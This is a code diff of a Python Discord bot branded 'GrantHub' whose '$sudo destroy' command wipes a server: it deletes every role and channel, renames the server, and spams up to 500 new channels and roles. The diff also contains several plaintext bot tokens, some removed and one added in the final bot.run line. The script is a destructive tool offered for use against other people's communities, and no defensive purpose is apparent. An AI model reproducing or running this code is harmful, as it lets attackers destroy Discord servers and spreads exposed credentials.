@@ -1,6 +1,3 @@
-import discord
-from discord.ext import commands
-from discord.utils import get
 print("		                                                                 ")
 print("░██████╗░██████╗░░█████╗░███╗░░██╗████████╗  ██╗░░██╗██╗░░░██╗██████╗░")
 print("██╔════╝░██╔══██╗██╔══██╗████╗░██║╚══██╔══╝  ██║░░██║██║░░░██║██╔══██╗")
@@ -8,9 +5,12 @@ print("██║░░██╗░██████╔╝███████�
 print("██║░░╚██╗██╔══██╗██╔══██║██║╚████║░░░██║░░░  ██╔══██║██║░░░██║██╔══██╗")
 print("╚██████╔╝██║░░██║██║░░██║██║░╚███║░░░██║░░░  ██║░░██║╚██████╔╝██████╦╝")
 print("░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░  ╚═╝░░╚═╝░╚═════╝░╚═════╝░")
+print("https://discord.com/api/oauth2/authorize?client_id=984435101154807889&permissions=268435504&scope=bot")
+import discord
+from discord.ext import commands
+from discord.utils import get
 texts = "GrantHubNo1"
 bot = commands.Bot(command_prefix="$sudo ", cas_insentive=True, help_command=None)
-token = 'OTg0NDM1MTAxMTU0ODA3ODg5.G82xqg.FFeAzS52UkloXaGrLTfb0641P_NZEQzLl5JGxU'
 text = texts
 name = text
 names = name
@@ -23,14 +23,17 @@ async def destroy(ctx):
             print("Delete Role")
         except:
             pass
-    await ctx.guild.edit(name=name)
+    try:
+        print("Change Server Name")
+        await ctx.guild.edit(name=name)
+    except:
+        pass
     for c in ctx.guild.channels:
         try:  
             await c.delete() 
             print("Delete Channel")
         except:
             pass
-    print("Change Name")
     for i in range(500):
         try:
             await guild.create_text_channel(name)
@@ -43,4 +46,5 @@ async def destroy(ctx):
             print("Create Role")
         except:
             pass
-bot.run('OTg0NDM1MTAxMTU0ODA3ODg5.GEEcJ6.03xoL2ZGGBluiFqT2PTEOE_pMkZQlNI77xJMkg')
+    print("Nuke Suscess")
+bot.run('OTg0NDM1MTAxMTU0ODA3ODg5.GxpnnB.IOl39z_boz69Xu_c5gxC6vCFsEce1WMhJRvN3I')
